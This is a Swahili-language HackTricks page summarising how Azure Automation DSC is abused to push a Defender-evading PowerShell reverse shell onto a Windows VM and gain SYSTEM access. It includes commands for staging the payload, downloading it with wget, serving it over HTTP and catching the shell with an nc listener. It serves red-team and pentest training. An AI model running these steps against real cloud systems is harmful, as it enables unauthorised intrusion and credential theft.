# Az - Hali ya Utekelezaji wa Udhibiti wa Mbali (RCE)

<details>

<summary><strong>Jifunze kuhusu udukuzi wa AWS kutoka mwanzo hadi mtaalamu na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Mtaalamu wa Timu Nyekundu ya AWS ya HackTricks)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako ikitangazwa kwenye HackTricks** au **kupakua HackTricks kwa PDF** Angalia [**MIPANGO YA USAJILI**](https://github.com/sponsors/carlospolop)!
* Pata [**bidhaa rasmi za PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) ya kipekee
* **Jiunge na** üí¨ [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au kikundi cha [**telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** üê¶ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Shiriki mbinu zako za udukuzi kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.

</details>

**Angalia chapisho kamili katika: [https://medium.com/cepheisecurity/abusing-azure-dsc-remote-code-execution-and-privilege-escalation-ab8c35dd04fe](https://medium.com/cepheisecurity/abusing-azure-dsc-remote-code-execution-and-privilege-escalation-ab8c35dd04fe)**

### Muhtasari wa Maandalizi na Hatua za Miundombinu ya Seva ya Mbali (C2)

#### Maelezo
Mchakato unahusisha kuweka miundombinu ya seva ya mbali kuhifadhi mzigo uliobadilishwa wa Nishang `Invoke-PowerShellTcp.ps1`, uitwao `RevPS.ps1`, ulioundwa kuvuka Windows Defender. Mzigo huo unahudumiwa kutoka kwa mashine ya Kali Linux yenye IP `40.84.7.74` kwa kutumia seva rahisi ya HTTP ya Python. Operesheni hutekelezwa kupitia hatua kadhaa:

#### Hatua 1 ‚Äî Unda Faili
- **Faili Zinazohitajika:** Inahitajika hati mbili za PowerShell:
1. `reverse_shell_config.ps1`: Faili ya Hali ya Utekelezaji Inayotakikana (DSC) ambayo hupata na kutekeleza mzigo. Inapatikana kwenye [GitHub](https://github.com/nickpupp0/AzureDSCAbuse/blob/master/reverse_shell_config.ps1).
2. `push_reverse_shell_config.ps1`: Hati ya kuchapisha usanidi kwenye VM, inapatikana kwenye [GitHub](https://github.com/nickpupp0/AzureDSCAbuse/blob/master/push_reverse_shell_config.ps1).
- **Ubadilishaji:** Vigezo na marameteri katika faili hizi lazima zibadilishwe kulingana na mazingira maalum ya mtumiaji, ikiwa ni pamoja na majina ya rasilimali, njia za faili, na vitambulishi vya seva/mzigo.

#### Hatua 2 ‚Äî Pakia Faili ya Usanidi kwenye Zip
- `reverse_shell_config.ps1` inafungwa katika faili ya `.zip`, ikifanya iwe tayari kwa uhamisho kwenye Akaunti ya Uhifadhi ya Azure.
```powershell
Compress-Archive -Path .\reverse_shell_config.ps1 -DestinationPath .\reverse_shell_config.ps1.zip
```
#### Hatua ya 3 ‚Äî Weka Muktadha wa Uhifadhi & Pakia
- Faili iliyozipwa ya usanidi inapakiwa kwenye chombo kilichopangwa mapema cha Uhifadhi wa Azure, azure-pentest, kwa kutumia amri ya Set-AzStorageBlobContent ya Azure.
```powershell
Set-AzStorageBlobContent -File "reverse_shell_config.ps1.zip" -Container "azure-pentest" -Blob "reverse_shell_config.ps1.zip" -Context $ctx
```
#### Hatua ya 4 ‚Äî Andaa Kali Box
- Seva ya Kali inapakua mzigo wa RevPS.ps1 kutoka kwenye hazina ya GitHub.
```bash
wget https://raw.githubusercontent.com/nickpupp0/AzureDSCAbuse/master/RevPS.ps1
```
- Skripti imehaririwa ili kufafanua lengo la VM ya Windows na bandari kwa reverse shell.

#### Hatua 5 ‚Äî Chapisha Faili ya Mipangilio
- Faili ya mipangilio inatekelezwa, ikisababisha skripti ya reverse-shell kuwekwa kwenye eneo lililoelezwa kwenye VM ya Windows.

#### Hatua 6 ‚Äî Mwenyeji wa Mzigo na Kuweka Msikilizaji
- Python SimpleHTTPServer inaanzishwa kuhudumia mzigo, pamoja na msikilizaji wa Netcat kukamata mawasiliano yanayoingia.
```bash
sudo python -m SimpleHTTPServer 80
sudo nc -nlvp 443
```
- Kazi iliyopangwa inatekeleza mzigo, ikipata mamlaka ya kiwango cha SYSTEM.

#### Hitimisho

Utekelezaji mafanikio wa mchakato huu hufungua fursa nyingi kwa hatua zaidi, kama vile kuvuja kwa siri za uthibitisho au kupanua shambulio kwa VM nyingi. Mwongozo unahimiza uendelezaji wa ujifunzaji na ubunifu katika uga wa Azure Automation DSC.

<details>

<summary><strong>Jifunze kuhusu kuvamia AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Mtaalam wa Timu Nyekundu ya HackTricks AWS)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako ikitangazwa kwenye HackTricks** au **kupakua HackTricks kwa PDF** Angalia [**MIPANGO YA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Pata [**bidhaa rasmi za PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) ya kipekee
* **Jiunge na** üí¨ [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au kikundi cha [**telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** üê¶ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Shiriki mbinu zako za kuvamia kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.

</details>
